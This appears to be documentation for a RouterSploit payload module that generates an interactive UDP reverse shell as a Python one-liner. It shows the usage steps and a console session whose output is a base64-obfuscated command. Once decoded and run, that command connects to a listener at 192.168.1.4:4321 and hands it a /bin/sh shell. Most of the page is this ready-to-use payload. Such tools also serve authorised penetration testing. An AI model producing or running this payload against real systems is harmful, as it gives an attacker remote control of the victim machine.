## Description

Module generates payload that creates interactive udp reverse shell by using python one-liner. 

## Verification Steps

  1. Start `./rsf.py`
  2. Do: `use payloads/cmd/python_reverse_udp`
  3. Do: `set lhost 192.168.1.4`
  4. Do: `set lport 4321`
  5. Do: `run`
  6. Module generates python udp reverse shell payload

## Scenarios

```
rsf > use payloads/cmd/python_reverse_udp
rsf (Python Reverse UDP One-Liner) > set lhost 192.168.1.4
[+] lhost => 192.168.1.4
rsf (Python Reverse UDP One-Liner) > set lport 4321
[+] lport => 4321
rsf (Python Reverse UDP One-Liner) > run
[*] Running module...
[*] Generating payload
python -c "exec('aW1wb3J0IG9zCmltcG9ydCBwdHkKaW1wb3J0IHNvY2tldApzPXNvY2tldC5zb2NrZXQoc29ja2V0LkFGX0lORVQsIHNvY2tldC5TT0NLX0RHUkFNKQpzLmNvbm5lY3QoKCcxOTIuMTY4LjEuNCcsNDMyMSkpCm9zLmR1cDIocy5maWxlbm8oKSwgMCkKb3MuZHVwMihzLmZpbGVubygpLCAxKQpvcy5kdXAyKHMuZmlsZW5vKCksIDIpCnB0eS5zcGF3bignL2Jpbi9zaCcpOwpzLmNsb3NlKCkK'.decode('base64'))"
```
